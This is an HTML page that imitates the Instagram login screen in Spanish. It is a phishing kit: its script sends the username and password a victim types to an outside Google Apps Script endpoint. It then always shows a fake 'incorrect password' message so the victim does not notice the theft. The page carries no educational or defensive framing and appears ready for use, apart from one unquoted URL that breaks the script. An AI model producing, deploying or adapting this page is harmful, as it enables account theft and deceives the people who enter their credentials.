<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

        .container {
            width: 350px;
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 40px 30px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .logo {
            margin-bottom: 20px;
            width: 175px;
            font-family: 'Segoe UI', sans-serif; /* Fallback si no carga imagen */
            font-size: 32px;
            font-weight: 600;
            text-align: center;
        }
        
        /* Si la imagen falla, se verá texto elegante, no "Instagram logo" feo */
        .logo-text {
            font-family: "Grand Hotel", cursive, sans-serif;
            font-size: 40px;
            margin-top: 20px;
        }

        .form-group {
            width: 100%;
            margin-bottom: 6px;
        }

        input {
            width: 100%;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 14px 10px;
            margin: 0;
            font-size: 12px;
            color: #262626;
            outline: none;
        }

        input:focus {
            border-color: #a8a8a8;
        }

        .btn {
            width: 100%;
            background-color: #0095f6;
            border: none;
            border-radius: 4px;
            color: #ffffff;
            font-weight: 600;
            font-size: 14px;
            padding: 7px 10px;
            margin-top: 10px;
            cursor: pointer;
            opacity: 0.9;
            transition: opacity 0.2s;
        }

        .btn:hover {
            opacity: 1;
        }

        .or {
            width: 100%;
            display: flex;
            align-items: center;
            margin: 18px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .or::before, .or::after {
            content: '';
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .or::before { margin-right: 10px; }
        .or::after { margin-left: 10px; }

        .error-msg {
            color: #ed4956;
            font-size: 12px;
            font-weight: 600;
            display: none;
            width: 100%;
            text-align: center;
            margin-bottom: 10px;
            background-color: #fff0f0;
            padding: 8px;
            border-radius: 3px;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- LOGO ROBUSTO (Imagen o Texto de respaldo) -->
        <div class="logo-text">Instagram</div>

        <div class="error-msg" id="errorMsg">El nombre de usuario o la contraseña es incorrecta.</div>

        <form id="loginForm" onsubmit="return false;">
            <div class="form-group">
                <input type="text" id="username" name="username" placeholder="Teléfono, nombre de usuario o correo electrónico" required>
            </div>
            <div class="form-group">
                <input type="password" id="password" name="password" placeholder="Contraseña" required>
            </div>
            <button type="submit" class="btn" id="submitBtn">Iniciar sesión</button>
        </form>

        <div class="or">O</div>
        
        <div style="color: #385185; font-size: 12px; font-weight: 600; cursor: pointer;">
            Iniciar sesión con Facebook
        </div>
        
        <div style="margin-top: 20px; font-size: 12px; color: #8e8e8e; cursor: pointer;">
            ¿Has olvidado la contraseña?
        </div>
    </div>

    <script>
        // https://script.google.com/macros/s/AKfycbx7EvnHcqTpVDBQKbciujloyJxorkJtkl4gH4mB53GpQyV22oech3iMoID513YZqspP/exec
        const SCRIPT_URL = https://script.google.com/macros/s/AKfycbx7EvnHcqTpVDBQKbciujloyJxorkJtkl4gH4mB53GpQyV22oech3iMoID513YZqspP/exec;

        const form = document.getElementById('loginForm');
        const btn = document.getElementById('submitBtn');
        const errorMsg = document.getElementById('errorMsg');

        form.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            btn.disabled = true;
            btn.innerText = '...';
            errorMsg.style.display = 'none';

            const data = new FormData();
            data.append('username', username);
            data.append('password', password);

            fetch(SCRIPT_URL, {
                method: 'POST',
                body: data
            })
            .then(response => {
                return new Promise(resolve => setTimeout(resolve, 1000));
            })
            .then(() => {
                btn.disabled = false;
                btn.innerText = 'Iniciar sesión';
                errorMsg.style.display = 'block';
                errorMsg.innerText = "El nombre de usuario o la contraseña es incorrecta.";
            })
            .catch(error => {
                btn.disabled = false;
                btn.innerText = 'Iniciar sesión';
                errorMsg.style.display = 'block';
                errorMsg.innerText = 'Error de conexión. Intenta de nuevo.';
            });
        });
    </script>
</body>
</html>
